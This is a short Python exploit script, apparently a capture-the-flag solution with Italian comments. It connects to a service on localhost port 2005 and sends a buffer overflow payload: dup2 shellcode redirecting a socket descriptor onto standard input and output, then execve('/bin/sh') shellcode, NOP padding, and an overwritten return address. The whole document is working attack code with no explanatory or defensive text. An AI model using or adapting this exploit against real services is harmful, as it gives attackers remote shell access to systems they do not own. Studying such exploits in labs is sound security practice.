from pwn import *
import time
context.update(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']
import socket

# Indirizzo e porta del server
server_address = ('localhost', 2005)

# Crea un socket TCP/IP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Connessione al server
    sock.connect(server_address)
    payload="""
    xor rax, rax
    mov rax, 0x21	
    mov rsi, 0x0
    mov rdi, 0x4
    syscall
    xor rax, rax
    mov rax, 0x21	
    mov rsi, 0x1
    mov rdi, 0x4
    syscall
    xor rax, rax
    mov rax, 0x21	
    mov rsi, 0x2
    mov rdi, 0x4
    syscall
    """

    shell="""
    xor rsi, rsi
    xor rdi, rdi
    xor rdx, rdx
    xor rax, rax
    mov rax, 0x3b
    mov rbx, 0x0068732f6e69622f
    push rbx
    mov rdi, rsp
    syscall
    """

    a=asm(payload)+asm(shell)+b"/bin/sh\x00"

    sock.sendall(a.ljust(1016, b'\x90')+p64(0x4040e0))


finally:
    # Chiudi il socket
    sock.close()
